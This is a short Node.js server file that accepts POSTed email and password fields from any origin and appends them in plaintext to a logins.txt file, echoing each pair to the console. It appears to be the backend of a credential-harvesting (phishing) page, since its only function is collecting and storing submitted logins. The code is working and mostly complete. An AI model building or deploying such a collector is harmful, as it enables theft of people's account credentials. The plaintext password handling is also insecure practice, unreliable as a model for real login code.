const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {

  // Allow requests from your HTML file
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/save') {
    let body = '';

    req.on('data', chunk => { body += chunk; });

    req.on('end', () => {
      const data = JSON.parse(body);
      const line = `Email: ${data.email} | Password: ${data.password}\n`;

      // Append to logins.txt
      fs.appendFile('logins.txt', line, (err) => {
        if (err) console.log('Error saving:', err);
        else console.log('Saved:', line.trim());
      });

      res.writeHead(200);
      res.end('OK');
    });
  }
});

server.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});